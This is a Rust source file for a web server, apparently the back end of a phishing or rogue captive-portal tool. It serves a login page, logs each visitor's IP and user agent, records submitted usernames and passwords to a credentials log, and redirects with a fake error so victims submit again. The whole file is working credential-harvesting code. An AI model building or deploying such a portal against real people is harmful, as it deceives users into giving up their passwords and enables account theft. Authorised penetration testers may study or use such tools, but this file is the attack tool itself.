use std::{net::SocketAddr, sync::Arc};

use anyhow::{Context, Result};
use axum::{
    extract::{ConnectInfo, Form, State},
    http::{header, HeaderMap, HeaderValue, StatusCode, Uri},
    middleware::Next,
    response::{Html, Redirect},
    routing::get,
    Router,
};
use serde::Deserialize;
use tower::limit::ConcurrencyLimitLayer;
use tower::ServiceBuilder;
use tower_http::limit::RequestBodyLimitLayer;
use tower_http::services::ServeDir;
use tower_http::timeout::TimeoutLayer;

use crate::config::PortalConfig;
use crate::logging::{format_credentials_line, format_visit_line, PortalLogger};

#[derive(Clone)]
pub struct PortalState {
    logger: PortalLogger,
    index_html: Arc<String>,
}

impl PortalState {
    pub fn new(logger: PortalLogger, index_html: String) -> Self {
        Self {
            logger,
            index_html: Arc::new(index_html),
        }
    }
}

#[derive(Deserialize)]
struct CaptureForm {
    username: Option<String>,
    password: Option<String>,
}

pub fn build_router(cfg: &PortalConfig, state: PortalState) -> Router {
    let middleware = ServiceBuilder::new()
        .layer(RequestBodyLimitLayer::new(cfg.max_body_bytes))
        .layer(TimeoutLayer::with_status_code(
            StatusCode::REQUEST_TIMEOUT,
            cfg.request_timeout,
        ))
        .layer(ConcurrencyLimitLayer::new(cfg.max_concurrency));

    Router::new()
        .route("/", get(get_index).post(post_capture))
        .fallback_service(ServeDir::new(&cfg.site_dir).append_index_html_on_directories(true))
        .with_state(state)
        .layer(axum::middleware::from_fn(security_headers_middleware))
        .layer(middleware)
}

pub async fn run_server(
    listener: std::net::TcpListener,
    app: Router,
    shutdown: tokio::sync::oneshot::Receiver<()>,
) -> Result<()> {
    let listener = tokio::net::TcpListener::from_std(listener)
        .context("converting portal listener to tokio listener")?;

    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .with_graceful_shutdown(async {
        let _ = shutdown.await;
    })
    .await
    .context("running portal server")?;

    Ok(())
}

async fn get_index(
    State(state): State<PortalState>,
    headers: HeaderMap,
    uri: Uri,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> Html<String> {
    log_visit(&state, &headers, &uri, addr).await;
    Html(state.index_html.as_str().to_string())
}

async fn post_capture(
    State(state): State<PortalState>,
    headers: HeaderMap,
    uri: Uri,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    Form(payload): Form<CaptureForm>,
) -> Redirect {
    log_visit(&state, &headers, &uri, addr).await;

    let ip = addr.ip().to_string();
    let ua = user_agent(&headers);
    let username = payload.username.unwrap_or_default();
    let password = payload.password.unwrap_or_default();

    let creds_line = format_credentials_line(&ip, &ua, &username, &password);
    if let Err(err) = state.logger.log_credentials_line(&creds_line).await {
        tracing::warn!("portal credentials log write failed: {err}");
    }

    let post_line = format_visit_line(&ip, &ua, &uri.to_string(), "post");
    if let Err(err) = state.logger.log_visit_line(&post_line).await {
        tracing::warn!("portal post visit log write failed: {err}");
    }

    Redirect::to("/?err=1")
}

async fn log_visit(state: &PortalState, headers: &HeaderMap, uri: &Uri, addr: SocketAddr) {
    let ip = addr.ip().to_string();
    let ua = user_agent(headers);
    let line = format_visit_line(&ip, &ua, &uri.to_string(), "view");
    if let Err(err) = state.logger.log_visit_line(&line).await {
        tracing::warn!("portal visit log write failed: {err}");
    }
}

async fn security_headers_middleware(
    req: axum::extract::Request,
    next: Next,
) -> axum::response::Response {
    let mut resp = next.run(req).await;
    let headers = resp.headers_mut();
    headers.insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static("no-store, no-cache, must-revalidate"),
    );
    headers.insert(header::X_FRAME_OPTIONS, HeaderValue::from_static("DENY"));
    headers.insert(
        header::X_CONTENT_TYPE_OPTIONS,
        HeaderValue::from_static("nosniff"),
    );
    headers.insert(
        "content-security-policy",
        HeaderValue::from_static(
            "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'",
        ),
    );
    resp
}

fn user_agent(headers: &HeaderMap) -> String {
    headers
        .get(header::USER_AGENT)
        .and_then(|value| value.to_str().ok())
        .unwrap_or("unknown")
        .to_string()
}
